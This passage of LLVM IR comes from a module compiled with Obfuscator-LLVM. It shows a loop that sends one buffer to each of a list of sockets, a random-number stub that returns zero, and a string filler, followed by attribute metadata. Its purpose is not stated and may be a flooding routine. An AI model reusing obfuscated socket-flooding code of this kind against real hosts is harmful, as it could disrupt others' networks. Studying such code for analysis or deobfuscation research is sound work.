  %67 = getelementptr inbounds i32, i32* %8, i64 %indvars.iv43
  %68 = load i32, i32* %67, align 4
  %69 = call i64 @send(i32 %68, i8* %62, i64 %61, i32 16384) #13
  %indvars.iv.next44 = add nuw i64 %indvars.iv43, 1
  %70 = load i8, i8* %4, align 1
  %71 = zext i8 %70 to i64
  %72 = icmp slt i64 %indvars.iv.next44, %71
  br i1 %72, label %.lr.ph40, label %.preheader.backedge.loopexit
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_new() local_unnamed_addr #11 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_string(i8* nocapture, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %._crit_edge.loopexit, label %._crit_edge

._crit_edge.loopexit:                             ; preds = %2
  %4 = add i32 %1, -1
  %5 = zext i32 %4 to i64
  %6 = add nuw nsw i64 %5, 1
  call void @llvm.memset.p0i8.i64(i8* %0, i8 97, i64 %6, i32 1, i1 false)
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

attributes #0 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { nounwind readonly }
attributes #13 = { nounwind }
attributes #14 = { nounwind readnone }
attributes #15 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2}
!2 = !{!"llvm.loop.unroll.disable"}
!3 = distinct !{!3, !2}
